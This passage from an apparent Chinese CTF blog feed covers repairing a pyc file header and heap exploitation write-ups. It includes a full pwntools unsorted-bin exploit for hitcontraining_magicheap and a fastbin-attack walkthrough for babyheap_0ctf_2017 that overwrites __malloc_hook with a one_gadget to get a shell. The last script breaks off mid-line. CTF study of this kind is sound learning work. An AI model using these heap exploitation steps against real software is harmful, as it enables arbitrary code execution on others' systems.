punctuation">(</span><span class="token string">"客户端的共享密钥:"</span><span class="token punctuation">,</span> shared_secret_client<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment"># 关闭连接</span></pre></td></tr><tr><td data-num="44"></td><td><pre>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pyc文件头修复</title>
      <link href="/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/"/>
      <url>/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>首先题目给了 pyc 文件为 python 37</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164118025.png" alt="image-20230513164118025"></p><p>然后 010editor 打开</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164147988.png" alt="image-20230513164147988"></p><p>发现文件头为 00  到 E3 那里都是 0  猜测文件头损坏</p><pre><code>enum PycMagic &#123;    MAGIC_1_0 = 0x00999902,    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */    MAGIC_1_3 = 0x0A0D2E89,    MAGIC_1_4 = 0x0A0D1704,    MAGIC_1_5 = 0x0A0D4E99,    MAGIC_1_6 = 0x0A0DC4FC,    MAGIC_2_0 = 0x0A0DC687,    MAGIC_2_1 = 0x0A0DEB2A,    MAGIC_2_2 = 0x0A0DED2D,    MAGIC_2_3 = 0x0A0DF23B,    MAGIC_2_4 = 0x0A0DF26D,    MAGIC_2_5 = 0x0A0DF2B3,    MAGIC_2_6 = 0x0A0DF2D1,    MAGIC_2_7 = 0x0A0DF303,    MAGIC_3_0 = 0x0A0D0C3A,    MAGIC_3_1 = 0x0A0D0C4E,    MAGIC_3_2 = 0x0A0D0C6C,    MAGIC_3_3 = 0x0A0D0C9E,    MAGIC_3_4 = 0x0A0D0CEE,    MAGIC_3_5 = 0x0A0D0D16,    MAGIC_3_5_3 = 0x0A0D0D17,    MAGIC_3_6 = 0x0A0D0D33,    MAGIC_3_7 = 0x0A0D0D42,    MAGIC_3_8 = 0x0A0D0D55,    MAGIC_3_9 = 0x0A0D0D61,&#125;;</code></pre><p>这些事常用的 python 文件头  修改文件头为 MAGIC_3_7 注意小端序也就是 42 0D 0D 0A</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164325195.png" alt="image-20230513164325195"></p><p>uncompyle6 -o <span class="exturl" data-url="aHR0cDovL3Rlc3QucHk=">test.py</span> 2.pyc</p><p>然后使用 uncompyle6 即可成功反编译出来源码  uncompyle6 使用 pip install uncompyle6 安装</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>unsortedbin attack</title>
      <link href="/2023/05/11/unsorted%20bin%20attack/"/>
      <url>/2023/05/11/unsorted%20bin%20attack/</url>
      
        <content type="html"><![CDATA[<h2 id="unsortedbin-attack"><a class="markdownIt-Anchor" href="#unsortedbin-attack">#</a> unsortedbin attack</h2><p>Unsorted Bin Attack 从字面上就可以看出，正合适一种针对 Unsorted Bin 机制的攻击手法。这种攻击手法实现的前提是能够控制挂进 unsorted bin 中的 chunk 的 bk 指针，在控制 bk 指针的情况下可以实现修改任意地址值为一个较大的数值</p><p>首先没有 chunk 挂入的时候 unsorted bin 的 fd 和 bk 指向自己</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511195726092.png" alt="image-20230511195726092"></p><p>如果有一个 chunk 进入 unsorted bin 时那么该春 chunk 的 fd 和 bk 都会指向 unsorted bin</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200319409.png" alt="image-20230511200319409"></p><p>fd 和 bk 指向 unsortedbin 的头</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200339778.png" alt="image-20230511200339778"></p><p>如果你修改 chunk400 的 bk 为 magic-0x10  也就是你 free 之后的 chunk_400 的 bk 为 magic-0x10 那么你就可以修改 magic 的值为较大值</p><p>为什么减去 0x10  因为 magic 的地址是 magic 的存储地址  而减去 0x10 之后的值才是 magic 的 malloc 之后的头地址  也就是 prev_size 的地址</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511202116589.png" alt="image-20230511202116589"></p><p>然后你重新申请一个堆块  假设 chunk_400 的大小为 0x80  那么你重新申请一个 0x80 大小的堆块  就会把 chunl_400 申请走</p><p>然后 magic-0x10 的这个堆块还在 那么 unsorted bin 的 fd 和 bk 就会指向 magic-0x10 的地方  然后 magic-0x10 的 fd 指针也就是 magic</p><p>就会指向 unsorted bin  同时 magic 的值就会改变为较大的值</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203517278.png" alt="image-20230511203517278"></p><p>修改前 chunk2 的 fd 和 bk 指向 unsorted bin 的头</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203637349.png" alt="image-20230511203637349"></p><p>修改后 chunk2 的 bk 指向 0x602090 也就是 magic-0x10 处   magic 为 0x6020c0</p><p>这个是修改前的 0x6020c0 的大小</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511204039362.png" alt="image-20230511204039362"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511212336461.png" alt="image-20230511212336461"></p><p>这个是修改后的 0x6020c0 的大小</p><p>add (0x80,‘dddd’)  只有申请一个新的堆块之后才能修改 magic 的值</p><p>具体看前面  已经说过了</p><p>buuctf hitcontraining_magicheap</p><p>// 题目的 magic 地址为 0x6020c0  但是打远程的时候是 0x6020a0 不清楚为什么</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142800500.png" alt="image-20230509142800500"></p><p>没有限制输入的数组大小所以存在堆溢出</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142849458.png" alt="image-20230509142849458"></p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># r=process("1")</span></pre></td></tr><tr><td data-num="3"></td><td><pre>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26699</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>magic <span class="token operator">=</span> <span class="token number">0x6020A0</span><span class="token operator">//</span>magic的地址  附件估计错了</pre></td></tr><tr><td data-num="27"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'4869'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment"># gdb.attach(r)</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment"># pause()</span></pre></td></tr><tr><td data-num="33"></td><td><pre>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF babyheap_0ctf_2017</title>
      <link href="/2023/04/17/Fastbin%20Attack/"/>
      <url>/2023/04/17/Fastbin%20Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf-babyheap_0ctf_2017"><a class="markdownIt-Anchor" href="#buuctf-babyheap_0ctf_2017">#</a> BUUCTF babyheap_0ctf_2017</h2><p>首先申请了 4 个堆  然后 free (1) 和 free (2) 接着修改 #2 的 fd 指向 #4 所在的位置  制造出 #4 被 free 的假象</p><p>然后修改 #4 的 size 位来避开 malloc 的检查。因为我们之后想在 chunk4 的地方重新 malloc</p><p>但是 malloc 的时候会检查 size 是否和要分配的大小相同，这就是为什么上面代码中我们要把 chunk4 的 size 位修改为 0x21</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415220317229.png" alt="image-20230415220317229"></p><p>然后重新申请了</p><p>allocate(0x10)<br>allocate(0x10)</p><p>这里可以看一下结构体内存位置 发现下标为 1 和下标为 2 的内存全为 0 也就是都被 free 掉了</p><p>所以第一个 allocate (0x10) 的内存地址指向下标为 1 的</p><p>第二个 alloca (0x10) 虽然是在 #4 堆块申请了地址 但是会去到下标为 2 的结构体中  但是内存地址指向了 #4 所在的内存地址</p><p>可以用这个看结构体所在位置  一般第一个就是的</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221026909.png" alt="image-20230415221026909"></p><p>x/1000gx 0x321776f75000  尽量多向后找点</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221139838.png" alt="image-20230415221139838"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221337737.png" alt="image-20230415221337737"></p><p>可以看到 allocate 后下标为 2 的结构体内存地址指向堆块 #4 和下标为 4 指向的堆块一样</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>0fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>1、fill (3,payload) 其实是将 chunk4 的 size 位变为之前的 0x91<br>2、allocate (0x80) 用来分割 top chunk 和 chunk4，防止堆块合并，因为我们后面要 free (4)<br> 3、free (4) 之后，chunk4 会被放到 unsorted bin 中。此时 chunk4 的 fd 指针是 unsorted bin 链表的头部，这个地址为 main_arena + 0x58</p><p>可以看到 0x91 那里已经 free 了所以不能 dump 输出</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211452367.png" alt="image-20230416211452367"></p><p>同时查看内存发现 index 为 4 那里为空证明已经被 free 了 而 index 为 2 那里的内存指向 index4 所以可以 dump 出来</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211534372.png" alt="image-20230416211534372"></p><p>然后查看结构体中的内存地址 不是堆中的 可以发现下标为 2 的内存地址指向下标为 4 的所以 dump 输出时输出下标为 2 的</p><p>可以输出 chunk4 中的内容</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>malloc_hook<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">88</span><span class="token operator">-</span><span class="token number">0x10</span></pre></td></tr><tr><td data-num="3"></td><td><pre>libc_base<span class="token operator">=</span>malloc_hook<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p>因为 dump (2) 那里会输出 main_arena + 0x58 的地址所以需要减去 0x58 再减去 0x10 会找到 malloc_hook 的地址</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416212411772.png" alt="image-20230416212411772"></p><p>然后 libcbase 的偏移就可以算出来了</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>此时 chunk4 是 unsorted bin。大小为 0x80，此时我们需要分配 0x60。会从 chunk4 里分割出来。我们把他定义为 chunk6，虽然是 chunk6，但是他在结构体数组中的索引为 4。因为 index 为 4 那里为空  所以他的内存地址为 chunk4</p><p>free (4)  4 是下标为 4 所以 free 的是才申请的 chunk6</p><p>这两步主要用来将 chunk4 分离出一个 fasbin 大小的 chunk6，然后再 free。chunk6 进入 fastbin。之后我们可以通过修改 chunk2 修改 chunk6 的值，然后再 malloc，进行 fastbin attack，可以任意地址分配。修改任意内存。</p><p>我们现在需要修改 <code>__malloc_hook</code>  的值。我们先找到 <code>__malloc_hook</code>  的地址</p><p>然后查看该 <code>__malloc_hook</code>  附近的内存空间。</p><p>我们想要在这范围内进行 malloc，就需要绕过 malloc 的限制。我们发现附近 <code>7f</code>  比较多，我们可以找一个内存地址，将 <code>7f</code>  当为我们要 malloc 的 size 位。</p><p>例如如下的内存地址， <code>0x7fd25e3b7aed</code> 。如果我们在这个地址进行 malloc，则 size 位为 0x7f。那我们分配一个 0x60 大小的 chunk，即可绕过 malloc 的限制。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416213543205.png" alt="image-20230416213543205"></p><p>最后一个字节是 7f 所以从 0x7f215166daed</p><p>算出偏移为 0x3c4aed</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>第一个 allocate (0x60) 分配到 chunk6</p><p>也就是下标为 4 的那里</p><p>第二个 allocate (0x60) 分配的是下标为 6 的 chunk 这里可以动调看一下结构体内存就懂了</p><p>修改完还没分配  可以看到 fd 那里是 libc_base+0x3c4aed</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416215139905.png" alt="image-20230416215139905"></p><p>第二个 allocate (0x60) 直接看堆是看不到的  需要看结构体指针那里 前面说过怎么看  会发现他的内存地址为 libc_base+0x3c4aed+0x10</p><p>为什么加了 0x10  可能是前面的下标和判断是否存在占了 0x10  具体还不是很懂</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token operator">=</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416214511799.png" alt="image-20230416214511799"></p><p>这里的 fill (6) 是修改的下标为 6 的结构体指针</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220041895.png" alt="image-20230416220041895"></p><p>修改的是下标为 6 所指向的内存地址也就是 0x00007f1d82b46afd 所指向的</p><p>这里因为中断了一下 所以内存地址变了  但还是上面那个 这个是修改前的</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220229133.png" alt="image-20230416220229133"></p><p>这是修改后的</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416221513786.png" alt="image-20230416221513786"></p><p>因为是倒序的所以 0d 对应 3 个 00 而 0e 对应两个 00 所以要 p8 (0)*3</p><p>执行代码后，即可修改 **__malloc_hook** 的值，可以看到已经将__malloc_hook 修改为 one_gadget 了。下次调用 malloc 或者 calloc 的时候就可以获得 shell。</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># r=remote("node4.buuoj.cn",28959)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc-2.23.so"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">allocate</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#0</span></pre></td></tr><tr><td data-num="35"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1</span></pre></td></tr><tr><td data-num="36"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2</span></pre></td></tr><tr><td data-num="37"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#3</span></pre></td></tr><tr><td data-num="38"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#4</span></pre></td></tr><tr><td data-num="39"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token 